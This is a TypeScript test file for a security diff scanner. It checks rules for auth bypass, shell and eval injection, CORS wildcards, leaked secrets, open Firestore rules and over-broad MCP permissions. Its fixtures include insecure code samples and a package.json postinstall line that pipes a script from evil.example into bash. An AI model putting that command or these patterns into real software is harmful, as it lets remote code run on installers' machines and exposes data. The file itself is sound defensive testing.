import { describe, expect, it } from "vitest";

import type { BuildRuleContextOptions } from "../test-helpers.js";
import { buildRuleContext } from "../test-helpers.js";
import type { Rule, Severity } from "../types/index.js";
import { envCommittedRule } from "./config/env-committed.js";
import { envPlaintextSecretRule } from "./config/env-plaintext-secret.js";
import { packageJsonDangerousScriptRule } from "./config/package-json-dangerous-script.js";
import { firebaseOpenRulesRule } from "./config/firebase-open-rules.js";
import { firestoreOpenReadRule } from "./config/firestore-open-read.js";
import { authBypassRule } from "./diff/auth-bypass.js";
import { authRemovedRule } from "./diff/auth-removed.js";
import { corsWildcardRule } from "./diff/cors-wildcard.js";
import { dangerousShellRule } from "./diff/dangerous-shell.js";
import { debugEndpointRule } from "./diff/debug-endpoint.js";
import { evalInjectionRule } from "./diff/eval-injection.js";
import { sensitiveLogRule } from "./diff/sensitive-log.js";
import { mcpAutoExecWithoutApprovalRule } from "./mcp/auto-exec-without-approval.js";
import { mcpFullHomeAccessRule } from "./mcp/full-home-access.js";
import { mcpRootAccessRule } from "./mcp/root-access.js";
import { mcpUnrestrictedNetworkRule } from "./mcp/unrestricted-network.js";

interface NonSecretRuleCase {
  title: string;
  rule: Rule;
  severity: Severity;
  truePositive: BuildRuleContextOptions;
  falsePositive: BuildRuleContextOptions;
  removedOnly: BuildRuleContextOptions;
  envReference: BuildRuleContextOptions;
  maskedValueMustNotContain: string[];
}

const openRulesContent = [
  "rules_version = '2';",
  "service cloud.firestore {",
  "  match /databases/{database}/documents {",
  "    match /{document=**} {",
  "      allow read, write: if true;",
  "    }",
  "  }",
  "}"
].join("\n");

const openReadContent = [
  "rules_version = '2';",
  "service cloud.firestore {",
  "  match /databases/{database}/documents {",
  "    match /public/{document=**} {",
  "      allow read: if true;",
  "    }",
  "  }",
  "}"
].join("\n");

const nonSecretRuleCases: NonSecretRuleCase[] = [
  {
    title: "diff/auth-bypass",
    rule: authBypassRule,
    severity: "critical",
    truePositive: {
      filePath: "src/auth/middleware.ts",
      addedLines: ["return true;"]
    },
    falsePositive: {
      filePath: "src/math.ts",
      addedLines: ["return true;"]
    },
    removedOnly: {
      filePath: "src/auth/middleware.ts",
      removedLines: ["return true;"]
    },
    envReference: {
      filePath: "src/auth/middleware.ts",
      addedLines: ['return process.env.AUTH_REQUIRED === "true";']
    },
    maskedValueMustNotContain: []
  },
  {
    title: "diff/auth-removed",
    rule: authRemovedRule,
    severity: "critical",
    truePositive: {
      filePath: "src/auth/middleware.ts",
      removedLines: ["requireAuth(req, res, next);"],
      contextBefore: ["router.get('/admin', handler);"]
    },
    falsePositive: {
      filePath: "src/lib/request.ts",
      removedLines: ["validateInput(payload);"]
    },
    removedOnly: {
      filePath: "src/lib/request.ts",
      removedLines: ["return payload;"]
    },
    envReference: {
      filePath: "src/auth/middleware.ts",
      addedLines: ["const authMode = process.env.AUTH_MODE;"]
    },
    maskedValueMustNotContain: []
  },
  {
    title: "diff/cors-wildcard",
    rule: corsWildcardRule,
    severity: "high",
    truePositive: {
      addedLines: ['headers: { "Access-Control-Allow-Origin": "*" }']
    },
    falsePositive: {
      addedLines: ['res.setHeader("Access-Control-Allow-Origin", "https://app.example.com");']
    },
    removedOnly: {
      removedLines: ['headers: { "Access-Control-Allow-Origin": "*" }']
    },
    envReference: {
      addedLines: ["const origin = process.env.CORS_ORIGIN;"]
    },
    maskedValueMustNotContain: []
  },
  {
    title: "diff/dangerous-shell",
    rule: dangerousShellRule,
    severity: "critical",
    truePositive: {
      addedLines: ["exec(req.body.command);"]
    },
    falsePositive: {
      addedLines: ['exec("npm run build");']
    },
    removedOnly: {
      removedLines: ["exec(req.body.command);"]
    },
    envReference: {
      addedLines: ["exec(process.env.SAFE_SCRIPT);"]
    },
    maskedValueMustNotContain: []
  },
  {
    title: "diff/debug-endpoint",
    rule: debugEndpointRule,
    severity: "high",
    truePositive: {
      addedLines: ['app.get("/debug/state", handler);']
    },
    falsePositive: {
      addedLines: ['app.get("/health", handler);']
    },
    removedOnly: {
      removedLines: ['app.get("/debug/state", handler);']
    },
    envReference: {
      addedLines: ["const debugEndpoint = process.env.DEBUG_ENDPOINT;"]
    },
    maskedValueMustNotContain: []
  },
  {
    title: "diff/eval-injection",
    rule: evalInjectionRule,
    severity: "high",
    truePositive: {
      addedLines: ["const value = eval(req.body.expression);"]
    },
    falsePositive: {
      addedLines: ["const value = parser.evaluate(expression);"]
    },
    removedOnly: {
      removedLines: ["const value = eval(req.body.expression);"]
    },
    envReference: {
      addedLines: ["const evaluator = process.env.EVALUATOR_NAME;"]
    },
    maskedValueMustNotContain: []
  },
  {
    title: "diff/sensitive-log",
    rule: sensitiveLogRule,
    severity: "medium",
    truePositive: {
      addedLines: ["console.log(user.token);"]
    },
    falsePositive: {
      addedLines: ['logger.info("token configured from environment");']
    },
    removedOnly: {
      removedLines: ["console.log(user.token);"]
    },
    envReference: {
      addedLines: ['logger.info("token configured from env");']
    },
    maskedValueMustNotContain: []
  },
  {
    title: "config/env-committed",
    rule: envCommittedRule,
    severity: "high",
    truePositive: {
      filePath: ".env",
      isNew: true,
      addedLines: ["APP_SECRET=not-for-output"]
    },
    falsePositive: {
      filePath: ".env.example",
      isNew: true,
      addedLines: ["APP_SECRET=change-me"]
    },
    removedOnly: {
      filePath: ".env",
      isDeleted: true,
      removedLines: ["APP_SECRET=old-value"]
    },
    envReference: {
      filePath: ".env.example",
      addedLines: ["APP_SECRET=${APP_SECRET}"]
    },
    maskedValueMustNotContain: ["not-for-output"]
  },
  {
    title: "config/env-plaintext-secret",
    rule: envPlaintextSecretRule,
    severity: "high",
    truePositive: {
      filePath: ".env",
      addedLines: ["OPENAI_API_KEY=sk-abcdefghijklmnopqrstuvwxyz123456"]
    },
    falsePositive: {
      filePath: ".env",
      addedLines: ["OPENAI_API_KEY=sk-your-api-key-placeholder"]
    },
    removedOnly: {
      filePath: ".env",
      removedLines: ["OPENAI_API_KEY=sk-abcdefghijklmnopqrstuvwxyz123456"]
    },
    envReference: {
      filePath: ".env",
      addedLines: ["OPENAI_API_KEY=${OPENAI_API_KEY}"]
    },
    maskedValueMustNotContain: ["abcdefghijklmnopqrstuvwxyz"]
  },
  {
    title: "config/package-json-dangerous-script",
    rule: packageJsonDangerousScriptRule,
    severity: "critical",
    truePositive: {
      filePath: "package.json",
      addedLines: ['    "postinstall": "curl -fsSL https://evil.example/install.sh | bash"']
    },
    falsePositive: {
      filePath: "package.json",
      addedLines: ['    "build": "tsc -p tsconfig.json"']
    },
    removedOnly: {
      filePath: "package.json",
      removedLines: ['    "postinstall": "curl -fsSL https://evil.example/install.sh | bash"']
    },
    envReference: {
      filePath: "package.json",
      addedLines: ['    "postinstall": "node scripts/install.js"']
    },
    maskedValueMustNotContain: []
  },
  {
    title: "config/firebase-open-rules",
    rule: firebaseOpenRulesRule,
    severity: "critical",
    truePositive: {
      filePath: "firestore.rules",
      addedLines: openRulesContent.split("\n"),
      rawContent: openRulesContent
    },
    falsePositive: {
      filePath: "firestore.rules",
      addedLines: ["allow read, write: if request.auth != null;"],
      rawContent: openRulesContent.replace("allow read, write: if true;", "allow read, write: if request.auth != null;")
    },
    removedOnly: {
      filePath: "firestore.rules",
      removedLines: ["allow read, write: if true;"]
    },
    envReference: {
      filePath: "firestore.rules",
      addedLines: ["allow read, write: if request.auth.token.admin == true;"],
      rawContent: openRulesContent.replace("allow read, write: if true;", "allow read, write: if request.auth.token.admin == true;")
    },
    maskedValueMustNotContain: []
  },
  {
    title: "config/firestore-open-read",
    rule: firestoreOpenReadRule,
    severity: "high",
    truePositive: {
      filePath: "firestore.rules",
      addedLines: openReadContent.split("\n"),
      rawContent: openReadContent
    },
    falsePositive: {
      filePath: "firestore.rules",
      addedLines: ["allow read: if request.auth != null;"],
      rawContent: openReadContent.replace("allow read: if true;", "allow read: if request.auth != null;")
    },
    removedOnly: {
      filePath: "firestore.rules",
      removedLines: ["allow read: if true;"]
    },
    envReference: {
      filePath: "firestore.rules",
      addedLines: ["allow read: if request.auth.token.public == true;"],
      rawContent: openReadContent.replace("allow read: if true;", "allow read: if request.auth.token.public == true;")
    },
    maskedValueMustNotContain: []
  },
  {
    title: "mcp/full-home-access",
    rule: mcpFullHomeAccessRule,
    severity: "critical",
    truePositive: {
      filePath: ".mcp/config.json",
      addedLines: ['"allowedDirectories": ["/Users/alice"]']
    },
    falsePositive: {
      filePath: ".mcp/config.json",
      addedLines: ['"allowedDirectories": ["/Users/alice/projects/guarddiff"]']
    },
    removedOnly: {
      filePath: ".mcp/config.json",
      removedLines: ['"allowedDirectories": ["/Users/alice"]']
    },
    envReference: {
      filePath: ".mcp/config.json",
      addedLines: ['"allowedDirectories": ["${PROJECT_DIR}"]']
    },
    maskedValueMustNotContain: []
  },
  {
    title: "mcp/root-access",
    rule: mcpRootAccessRule,
    severity: "critical",
    truePositive: {
      filePath: ".mcp/config.json",
      addedLines: ['"roots": ["/"]']
    },
    falsePositive: {
      filePath: ".mcp/config.json",
      addedLines: ['"endpoint": "https://api.example.com/"']
    },
    removedOnly: {
      filePath: ".mcp/config.json",
      removedLines: ['"roots": ["/"]']
    },
    envReference: {
      filePath: ".mcp/config.json",
      addedLines: ['"roots": ["${PROJECT_ROOT}"]']
    },
    maskedValueMustNotContain: []
  },
  {
    title: "mcp/auto-exec-without-approval",
    rule: mcpAutoExecWithoutApprovalRule,
    severity: "high",
    truePositive: {
      filePath: ".mcp/config.yaml",
      addedLines: ["approval_policy: never"]
    },
    falsePositive: {
      filePath: ".mcp/config.yaml",
      addedLines: ["approval_policy: manual"]
    },
    removedOnly: {
      filePath: ".mcp/config.yaml",
      removedLines: ["approval_policy: never"]
    },
    envReference: {
      filePath: ".mcp/config.yaml",
      addedLines: ["approval_policy: ${APPROVAL_POLICY}"]
    },
    maskedValueMustNotContain: []
  },
  {
    title: "mcp/unrestricted-network",
    rule: mcpUnrestrictedNetworkRule,
    severity: "high",
    truePositive: {
      filePath: ".mcp/config.yaml",
      addedLines: ["network_access: true"]
    },
    falsePositive: {
      filePath: ".mcp/config.yaml",
      addedLines: ["network_access: false"]
    },
    removedOnly: {
      filePath: ".mcp/config.yaml",
      removedLines: ["network_access: true"]
    },
    envReference: {
      filePath: ".mcp/config.yaml",
      addedLines: ["network_access: ${NETWORK_ACCESS}"]
    },
    maskedValueMustNotContain: []
  }
];

for (const testCase of nonSecretRuleCases) {
  describe(testCase.title, () => {
    it("detects a representative true positive", () => {
      const findings = testCase.rule.detect(buildRuleContext(testCase.truePositive));

      expect(findings).toHaveLength(1);
      expect(findings[0].severity).toBe(testCase.severity);
    });

    it("does not detect representative false positives", () => {
      expect(testCase.rule.detect(buildRuleContext(testCase.falsePositive))).toHaveLength(0);
    });

    it("does not detect removed-only non-risk examples", () => {
      expect(testCase.rule.detect(buildRuleContext(testCase.removedOnly))).toHaveLength(0);
    });

    it("does not detect environment or configuration references", () => {
      expect(testCase.rule.detect(buildRuleContext(testCase.envReference))).toHaveLength(0);
    });

    it("does not expose forbidden raw values in matched content", () => {
      const findings = testCase.rule.detect(buildRuleContext(testCase.truePositive));

      expect(findings).toHaveLength(1);
      expect(findings[0].matchedContent).toBeDefined();
      for (const forbidden of testCase.maskedValueMustNotContain) {
        expect(findings[0].matchedContent).not.toContain(forbidden);
      }
    });
  });
}

describe("diff/auth-bypass focused false positives", () => {
  it("does not treat distant authorization headers as auth-bypass context", () => {
    const findings = authBypassRule.detect(
      buildRuleContext({
        filePath: "integrations/github-action/src/lib.ts",
        contextBefore: [
          'headers: { Authorization: `Bearer ${token}` },',
          "const candidateParts = parseSemver(candidate);",
          "const currentParts = parseSemver(current);",
          "for (let index = 0; index < 3; index += 1) {",
          "if (candidateParts[index] > currentParts[index]) {"
        ],
        addedLines: ["return true;"],
        contextAfter: ["}"]
      })
    );

    expect(findings).toHaveLength(0);
  });
});
